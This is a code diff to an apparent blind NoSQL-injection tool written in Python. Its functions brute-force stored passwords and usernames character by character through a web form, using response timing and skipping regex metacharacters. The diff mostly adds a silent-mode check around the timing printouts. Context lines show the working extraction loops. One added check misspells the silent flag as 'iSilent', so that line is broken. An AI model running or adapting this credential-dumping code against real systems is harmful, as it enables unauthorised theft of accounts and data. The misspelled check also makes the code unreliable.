@@ -9,6 +9,7 @@ from _helper import *
 def dumpKnownValue(nsi, form_data, password):
     start_time_length = time.time()
     total_time_length = 0
+    # alphabet = list(string.ascii_lowercase) + list(string.ascii_uppercase) + list(string.digits) + list(string.punctuation)
     # count length
     for c in range(0, 9999999):
         # for element in form_data:
@@ -28,12 +29,14 @@ def dumpKnownValue(nsi, form_data, password):
             length = c
             total_time_length += time_taken
             break
-    print(colored(f"Time taken length for {length}: {total_time_length}", "yellow", attrs=["blink"]))
-    print("============================================\n")
+    if (not nsi.isSilent):
+        print(colored(f"Time taken length for {length}: {total_time_length}", "yellow", attrs=["blink"]))
+    # print("============================================\n")
     
     start_time_char = time.time()
     total_time_char = []
     for x in range(length):
+        # for c in alphabet:
         for c in range(0x20, 0x7f):
             c = chr(c) # returns the character that represents the specified unicode.
             if c not in ["*", "+", ".", "?", "|", "'", '"', "&", " "]:
@@ -52,7 +55,8 @@ def dumpKnownValue(nsi, form_data, password):
                     time_taken = end_time - start_time_char
                     print("Result : %s" % (password + c), end="\r")
                     password += c
-                    print(colored(f"Time taken for {c}: {time_taken}", "yellow", attrs=["blink"]))
+                    if (not nsi.isSilent):
+                        print(colored(f"Time taken for {c}: {time_taken}", "yellow", attrs=["blink"]))
                     total_time_char.append(time_taken)
                     start_time_char = time.time()
                     break
@@ -63,6 +67,7 @@ def dumpKnownValue(nsi, form_data, password):
 def getPrefix(nsi, form_data):
     prefixUsernames = []
     alphabet = range(0x20, 0x7f)
+    # alphabet = list(string.ascii_lowercase) + list(string.ascii_uppercase) + list(string.digits) + list(string.punctuation)
     start_time = time.time()
     total_time = 0
     timesPrefix = []
@@ -83,7 +88,8 @@ def getPrefix(nsi, form_data):
                 timesPrefix.append({
                     c: time_taken
                 })
-                print(colored(f"Time taken for {c}: {time_taken}", "yellow", attrs=["blink"]))
+                if (not nsi.isSilent):
+                    print(colored(f"Time taken for {c}: {time_taken}", "yellow", attrs=["blink"]))
 
     print(colored(f"Total time get username prefixes: {total_time}", "yellow", attrs=["blink"]))
     print(timesPrefix)
@@ -95,6 +101,8 @@ def getPrefix(nsi, form_data):
 def dumpData(nsi, username, form_data, total_time = 0):
     # alphabet = list(string.ascii_letters) + list(string.digits)
     alphabet = range(0x20, 0x7f)
+    # alphabet = list(string.ascii_lowercase) + list(string.ascii_uppercase) + list(string.digits) + list(string.punctuation)
+    
     updated_form_data = {}
     start_time = time.time()
 
@@ -126,7 +134,9 @@ def dumpData(nsi, username, form_data, total_time = 0):
                 time_taken = end_time - start_time
                 total_time += time_taken
                 
-                print(colored(f"Time taken for append {c}: {time_taken}", "yellow", attrs=["blink"]))
+                if (not nsi.iSilent):
+                    print(colored(f"Time taken for append {c}: {time_taken}", "yellow", attrs=["blink"]))
+                    
                 start_time = time.time()
                 dumpData(nsi, username + c, form_data, total_time)
                 total_time = 0
